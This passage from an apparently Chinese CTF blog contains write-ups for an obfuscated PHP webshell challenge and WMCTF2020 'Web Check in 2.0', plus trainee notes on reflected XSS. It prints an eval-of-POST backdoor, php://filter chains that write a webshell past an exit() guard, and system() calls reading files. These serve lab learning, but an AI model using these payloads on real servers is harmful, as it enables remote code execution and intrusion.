<span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">24</span>, <span class="hljs-number">63</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">12</span>, <span class="hljs-number">68</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">17</span>, <span class="hljs-number">37</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">17</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">40</span>, <span class="hljs-number">42</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">49</span>, <span class="hljs-number">42</span>, <span class="hljs-number">25</span>, <span class="hljs-number">5</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">70</span>, <span class="hljs-number">42</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">1</span>, <span class="hljs-number">17</span>, <span class="hljs-number">80</span>, <span class="hljs-number">58</span>, <span class="hljs-number">66</span>, <span class="hljs-number">3</span>, <span class="hljs-number">86</span>, <span class="hljs-number">27</span>, <span class="hljs-number">88</span>, <span class="hljs-number">77</span>, <span class="hljs-number">80</span>, <span class="hljs-number">38</span>, <span class="hljs-number">25</span>, <span class="hljs-number">40</span>, <span class="hljs-number">81</span>, <span class="hljs-number">20</span>, <span class="hljs-number">5</span>, <span class="hljs-number">76</span>, <span class="hljs-number">81</span>, <span class="hljs-number">15</span>, <span class="hljs-number">50</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">24</span>, <span class="hljs-number">81</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">40</span>, <span class="hljs-number">90</span>, <span class="hljs-number">58</span>, <span class="hljs-number">81</span>, <span class="hljs-number">40</span>, <span class="hljs-number">30</span>, <span class="hljs-number">75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">27</span>, <span class="hljs-number">19</span>, <span class="hljs-number">75</span>, <span class="hljs-number">28</span>, <span class="hljs-number">7</span>, <span class="hljs-number">88</span>, <span class="hljs-number">32</span>, <span class="hljs-number">45</span>, <span class="hljs-number">7</span>, <span class="hljs-number">90</span>, <span class="hljs-number">52</span>, <span class="hljs-number">80</span>, <span class="hljs-number">58</span>, <span class="hljs-number">5</span>, <span class="hljs-number">70</span>, <span class="hljs-number">63</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">66</span>, <span class="hljs-number">42</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">0</span>, <span class="hljs-number">12</span>, <span class="hljs-number">50</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">83</span>, <span class="hljs-number">43</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">90</span>, <span class="hljs-number">38</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">7</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">72</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">0</span>, <span class="hljs-number">25</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">11</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">87</span>, <span class="hljs-number">70</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">7</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">18</span>, <span class="hljs-number">1</span>, <span class="hljs-number">87</span>, <span class="hljs-number">42</span>, <span class="hljs-number">24</span>, <span class="hljs-number">60</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">17</span>, <span class="hljs-number">91</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">75</span>, <span class="hljs-number">49</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">45</span>, <span class="hljs-number">12</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">90</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">81</span>, <span class="hljs-number">37</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">49</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">40</span>, <span class="hljs-number">63</span>, <span class="hljs-number">25</span>, <span class="hljs-number">5</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">18</span>, <span class="hljs-number">68</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">1</span>, <span class="hljs-number">18</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">0</span>, <span class="hljs-number">25</span>, <span class="hljs-number">5</span>, <span class="hljs-number">37</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">90</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">72</span>, <span class="hljs-number">37</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">66</span>, <span class="hljs-number">63</span>, <span class="hljs-number">50</span>, <span class="hljs-number">5</span>, <span class="hljs-number">40</span>, <span class="hljs-number">63</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">24</span>, <span class="hljs-number">63</span>, <span class="hljs-number">87</span>, <span class="hljs-number">63</span>, <span class="hljs-number">12</span>, <span class="hljs-number">68</span>, <span class="hljs-number">87</span>, <span class="hljs-number">0</span>, <span class="hljs-number">24</span>, <span class="hljs-number">17</span>, <span class="hljs-number">37</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">90</span>, <span class="hljs-number">25</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">18</span>, <span class="hljs-number">90</span>, <span class="hljs-number">87</span>, <span class="hljs-number">93</span>, <span class="hljs-number">18</span>, <span class="hljs-number">90</span>, <span class="hljs-number">38</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">18</span>, <span class="hljs-number">75</span>, <span class="hljs-number">70</span>, <span class="hljs-number">28</span>, <span class="hljs-number">48</span>, <span class="hljs-number">19</span>, <span class="hljs-number">40</span>, <span class="hljs-number">90</span>, <span class="hljs-number">58</span>, <span class="hljs-number">37</span>, <span class="hljs-number">91</span>, <span class="hljs-number">63</span>, <span class="hljs-number">75</span>, <span class="hljs-number">11</span>, <span class="hljs-number">79</span>, <span class="hljs-number">28</span>, <span class="hljs-number">27</span>, <span class="hljs-number">75</span>, <span class="hljs-number">3</span>, <span class="hljs-number">42</span>, <span class="hljs-number">23</span>, <span class="hljs-number">88</span>, <span class="hljs-number">30</span>, <span class="hljs-number">35</span>, <span class="hljs-number">47</span>, <span class="hljs-number">59</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">73</span>, <span class="hljs-number">35</span>, <span class="hljs-number">68</span>, <span class="hljs-number">38</span>, <span class="hljs-number">63</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">38</span>, <span class="hljs-number">45</span>, <span class="hljs-number">30</span>, <span class="hljs-number">81</span>, <span class="hljs-number">15</span>, <span class="hljs-number">50</span>, <span class="hljs-number">12</span>, <span class="hljs-number">1</span>, <span class="hljs-number">24</span>, <span class="hljs-number">81</span>, <span class="hljs-number">66</span>, <span class="hljs-number">28</span>, <span class="hljs-number">40</span>, <span class="hljs-number">90</span>, <span class="hljs-number">58</span>, <span class="hljs-number">81</span>, <span class="hljs-number">40</span>, <span class="hljs-number">30</span>, <span class="hljs-number">75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">27</span>, <span class="hljs-number">19</span>, <span class="hljs-number">75</span>, <span class="hljs-number">28</span>, <span class="hljs-number">23</span>, <span class="hljs-number">75</span>, <span class="hljs-number">77</span>, <span class="hljs-number">1</span>, <span class="hljs-number">28</span>, <span class="hljs-number">1</span>, <span class="hljs-number">43</span>, <span class="hljs-number">52</span>, <span class="hljs-number">31</span>, <span class="hljs-number">19</span>, <span class="hljs-number">75</span>, <span class="hljs-number">81</span>, <span class="hljs-number">40</span>, <span class="hljs-number">30</span>, <span class="hljs-number">75</span>, <span class="hljs-number">1</span>, <span class="hljs-number">27</span>, <span class="hljs-number">75</span>, <span class="hljs-number">77</span>, <span class="hljs-number">35</span>, <span class="hljs-number">47</span>, <span class="hljs-number">59</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">73</span>, <span class="hljs-number">21</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">51</span>, <span class="hljs-number">40</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">91</span>, <span class="hljs-number">7</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">77</span>, <span class="hljs-number">49</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">91</span>, <span class="hljs-number">70</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">49</span>, <span class="hljs-number">51</span>, <span class="hljs-number">4</span>, <span class="hljs-number">51</span>, <span class="hljs-number">91</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">70</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">91</span>, <span class="hljs-number">91</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">51</span>, <span class="hljs-number">70</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">91</span>, <span class="hljs-number">49</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">51</span>, <span class="hljs-number">6</span>, <span class="hljs-number">4</span>, <span class="hljs-number">7</span>, <span class="hljs-number">91</span>, <span class="hljs-number">91</span>, <span class="hljs-number">4</span>, <span class="hljs-number">37</span>, <span class="hljs-number">51</span>, <span class="hljs-number">70</span>, <span class="hljs-number">21</span>, <span class="hljs-number">47</span>, <span class="hljs-number">93</span>, <span class="hljs-number">8</span>, <span class="hljs-number">10</span>, <span class="hljs-number">58</span>, <span class="hljs-number">82</span>, <span class="hljs-number">59</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">82</span>, <span class="hljs-number">59</span>, <span class="hljs-number">71</span>, <span class="hljs-number">71</span>, <span class="hljs-number">29</span>, <span class="hljs-number">29</span>, <span class="hljs-number">47</span>);<br><span class="hljs-variable">$do_me</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$order</span>);<span class="hljs-variable">$i</span>++)<br>&#123;<br>    <span class="hljs-variable">$do_me</span>=<span class="hljs-variable">$do_me</span>.<span class="hljs-variable">$terms</span>[<span class="hljs-variable">$order</span>[<span class="hljs-variable">$i</span>]];<br>&#125;<br><span class="hljs-comment">#   echo($do_me);</span><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$do_me</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>回显一下do_me。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_</span>= \<span class="hljs-string">&#x27;aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9\&#x27;;</span><br><span class="hljs-string">$__=\&#x27;JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7\&#x27;;</span><br><span class="hljs-string">$___=&quot;\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65&quot;;</span><br><span class="hljs-string">eval($___($__));</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>base64解码一下。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;\x61\x31\x31\x44\x4F\x54\x74\x68\x61\x74\x44\x4F\x54\x6A\x61\x76\x61\x35\x63\x72\x61\x70\x41\84\x66\x6C\x61\x72\x65\x44\65\x53\72\111\110\x44\79\84\99\x6F\x6D&quot;</span>]))<br>&#123;<br><span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D&quot;</span>]));<br>&#125;<br><span class="hljs-variable">$code</span>=<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_</span>);<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br></code></pre></td></tr></table></figure><p>这里就没有去写脚本了。\ 后面跟十进制数，\x 后面跟十六进制数。网站直接16进制转字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 16进制">\x61\x31\x31\x44\x4F\x54\x74\x68\x61\x74\x44\x4F\x54\x6A\x61\x76\x61\x35\x63\x72\x61\x70\x41\x54\x66\x6C\x61\x72\x65\x44\x41\x53\x48\x6f\x6e\x44\x4f\x54\x63\x6F\x6D<br><br>a11DOTthatDOTjava5crapATflareDASHonDOTcom<br></code></pre></td></tr></table></figure><p>后续是看了wp的。</p><p><strong>按照 flareon 比赛 flag 的尿性，DOT 要换成 .，AT 换成 @，DASH 换成 -，得到最终的 flag</strong><br>最终<a href="mailto:&#97;&#49;&#x31;&#x2e;&#x74;&#x68;&#97;&#x74;&#46;&#x6a;&#x61;&#118;&#x61;&#53;&#x63;&#x72;&#97;&#x70;&#x40;&#102;&#108;&#x61;&#114;&#x65;&#45;&#x6f;&#110;&#x2e;&#x63;&#111;&#x6d;">&#97;&#49;&#x31;&#x2e;&#x74;&#x68;&#97;&#x74;&#46;&#x6a;&#x61;&#118;&#x61;&#53;&#x63;&#x72;&#97;&#x70;&#x40;&#102;&#108;&#x61;&#114;&#x65;&#45;&#x6f;&#110;&#x2e;&#x63;&#111;&#x6d;</a>。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220218183842.png"></p><h2 id="WMCTF2020-Web-Check-in-2-0"><a href="#WMCTF2020-Web-Check-in-2-0" class="headerlink" title="[WMCTF2020]Web Check in 2.0"></a>[WMCTF2020]Web Check in 2.0</h2><p>进去一看代码 感觉读懂了。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220215113647.png" alt="QQ截图20220215113647"></p><p>洋洋得意直接构造链接—&gt;<a href="http://48571e46-9b1c-4cf3-9889-cfbef23ea393.node4.buuoj.cn:81/?content=flag.php">http://48571e46-9b1c-4cf3-9889-cfbef23ea393.node4.buuoj.cn:81/?content=flag.php</a><br>很打脸。<br>然后再仔细读了读。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">exit</span>();&gt;<br></code></pre></td></tr></table></figure><p>这不是直接就退出了嘛。网上翻阅很久资料后续看到p神的文章。<br><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><h3 id="绕过-lt-php-exit-gt"><a href="#绕过-lt-php-exit-gt" class="headerlink" title="绕过&lt;?php exit();&gt;"></a>绕过&lt;?php exit();&gt;</h3><p><a href="https://bbs.pediy.com/thread-271283.htm%E8%BF%99%E6%98%AFh3%E5%B8%88%E5%82%85%E7%9A%84%E6%96%87%E7%AB%A0%EF%BC%8C%E5%BB%BA%E8%AE%AE%E8%AF%A6%E8%AF%BB%E3%80%82">https://bbs.pediy.com/thread-271283.htm这是h3师傅的文章，建议详读。</a></p><h3 id="巧用base64编码"><a href="#巧用base64编码" class="headerlink" title="巧用base64编码"></a>巧用base64编码</h3><p>p神文章讲的很清楚。<br>自己不很清楚点的。</p><ul><li>&#96;&#96;&#96;php<br>$content .&#x3D; $_POST[‘txt’];  #这里的点是连接的意思，哈哈哈小白非常菜 仔细读p神的文章及他的图片+半猜半蒙<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>- base64解码方式：“phpexit”一共<span class="hljs-number">7</span>个字符，因为base64算法解码时是<span class="hljs-number">4</span>个byte一组，所以给他增加<span class="hljs-number">1</span>个“a”一共<span class="hljs-number">8</span>个字符。这样，<span class="hljs-string">&quot;phpexita&quot;</span>被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是`<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">exit</span>; <span class="hljs-meta">?&gt;</span>`没有了。<br><br>- ```php<br>  <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;txt&#x27;</span>])<br>  <span class="hljs-comment">#匹配字符 替换成的字符 替换目标</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="巧用字符串操作"><a href="#巧用字符串操作" class="headerlink" title="巧用字符串操作"></a>巧用字符串操作</h3><ul><li><pre><code class="php">&lt;?php exit; ?&gt; # 实际上是一个XML标签<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><br>- ```php<br>  strip_tags() # — 从字符串中去除 HTML 和 PHP 标记<br></code></pre></td></tr></table></figure></code></pre></li><li><p>php:&#x2F;&#x2F;filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p></li><li><p>除此之外，我们还可以利用rot13编码独立完成任务。原理和上面类似，核心是将“死亡exit”去除。<code>&lt;?php exit; ?&gt;</code>在经过rot13编码后会变成<code>&lt;?cuc rkvg; ?&gt;</code>，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了。</p></li></ul><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><h3 id="require-once"><a href="#require-once" class="headerlink" title="require_once"></a>require_once</h3><p>rot3加密：<a href="http://www.hiencode.com/rot13.html">http://www.hiencode.com/rot13.html</a><br>require_once:<a href="https://www.php.net/manual/zh/function.require-once.php">https://www.php.net/manual/zh/function.require-once.php</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span>   <span class="hljs-comment">#rot3编码</span><br>cuc @<span class="hljs-title function_ invoke__">riny</span>(<span class="hljs-variable">$_cbfg</span>[<span class="hljs-string">&#x27;pzq&#x27;</span>]);<br><br>php:<span class="hljs-comment">//filter/write=string.%7%32ot13|cuc @riny($_cbfg[&#x27;pzq&#x27;]);|/resource=shell.php </span><br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220215144143.png" alt="QQ截图20220215144143"></p><p>这里就导致不能直接写入一句话木马，导致每次都要重写文件。(来自<strong>H3h3QAQ</strong>)师傅的解答。</p><h3 id="过滤器绕过"><a href="#过滤器绕过" class="headerlink" title="过滤器绕过"></a>过滤器绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">?<br>content=php:<span class="hljs-comment">//filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=h3.php</span><br><br>?content=h3.php&amp;<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);  <br><br>?content=php:<span class="hljs-comment">//filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=h3.php</span><br><br>?content=h3.php&amp;<span class="hljs-number">1</span>=<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>); <br><br></code></pre></td></tr></table></figure><p>这里直接采用h3师傅的绕过。哈哈哈。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220215145358.png" alt="QQ截图20220215145358"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220215144737.png" alt="QQ截图20220215144737"></p><p>帮婆婆拖地去了，明天就要走了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nepnep见习队员任务（不完整）</title>
    <link href="/2022/02/24/Nepnep%E8%A7%81%E4%B9%A0%E9%98%9F%E5%91%98%E4%BB%BB%E5%8A%A1%EF%BC%88%E4%B8%8D%E5%AE%8C%E6%95%B4%EF%BC%89/"/>
    <url>/2022/02/24/Nepnep%E8%A7%81%E4%B9%A0%E9%98%9F%E5%91%98%E4%BB%BB%E5%8A%A1%EF%BC%88%E4%B8%8D%E5%AE%8C%E6%95%B4%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Nepnep见习队员"><a href="#Nepnep见习队员" class="headerlink" title="Nepnep见习队员"></a>Nepnep见习队员</h1><h2 id="初学-视频1"><a href="#初学-视频1" class="headerlink" title="初学-视频1"></a>初学-视频1</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220217222652.png" alt="QQ截图20220217222652"></p><p>去youtube上找了翻译嘿嘿。<a href="https://www.youtube.com/watch?v=zPYfT9azdK8&amp;list=PLxhvVyxYRviZd1oEA9nmnilY3PhVrt4nj">https://www.youtube.com/watch?v=zPYfT9azdK8&amp;list=PLxhvVyxYRviZd1oEA9nmnilY3PhVrt4nj</a> （字幕自带翻译）</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220217222851.png" alt="QQ截图20220217222851"></p><p>这里就先回答第一个问题。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.本视频一开始介绍了哪两个工具，他们的作用分别是什么？为什么作者会推荐firefox，它的优点是什么？（<span class="hljs-number">5</span>分）<br><br><span class="hljs-attribute">bp</span>（抓包） 和 firefox（设置代理方便）<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">2.本视频中体现了哪些攻防上的哲学观点？作者希望你养成什么样的思维？这些思维在帮助你挖掘漏洞的时候有什么帮助？结合你的经历与视频内容谈谈你的看法。（10分）<br><br>体会太多啦~~<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br>if(isset($_GET[ &#x27; name &#x27; ]))&#123;<br>echo &quot;&lt;h1&gt;Hello &#123;$_GET[&#x27;name&#x27;]&#125; !&lt;/h1&gt;&quot;;<br>&#125;<br>?&gt;<br>如果get方法存在name变量声明，则输出name的值。<br>&lt;form method=&quot;GET&quot;&gt;<br>Enter your name: &lt;input type=&quot;input&quot; name=&quot;name&quot;&gt;&lt;br&gt;<br>&lt;input type=&quot; submit&quot;&gt;<br>那么，以上代码中，哪些部分属于客户端的内容，哪些属于服务端的内容？（1分）<br>服务端：前面部分 客户端：后面部分<br>    <br>客户端是通过传递什么参数来控制服务端代码的？（1分）<br>get<br><br>客户端通过控制该参数会对服务端造成什么影响，继而使得客户端本身收到影响，从而造成了什么漏洞？如果是xss漏洞，具体又是什么类型的xss漏洞，为什么？（3分）<br>xss，反射。反射直接在网页中回显。<br>    <br>思考：现实中如何利用xss漏洞实施攻击，我们应该如何预防？（1分）<br>盗取cookie。<br>预防：1、过滤参数（但是无法完全实现），比如URL和参数进行各种的编码，比如escape, encodeURI, encodeURIComponent, 16进制，10进制，8进制，来绕过XSS过滤。<br>    2、黑白名单结合<br></code></pre></td></tr></table></figure><h2 id="初学-视频2"><a href="#初学-视频2" class="headerlink" title="初学-视频2"></a>初学-视频2</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code 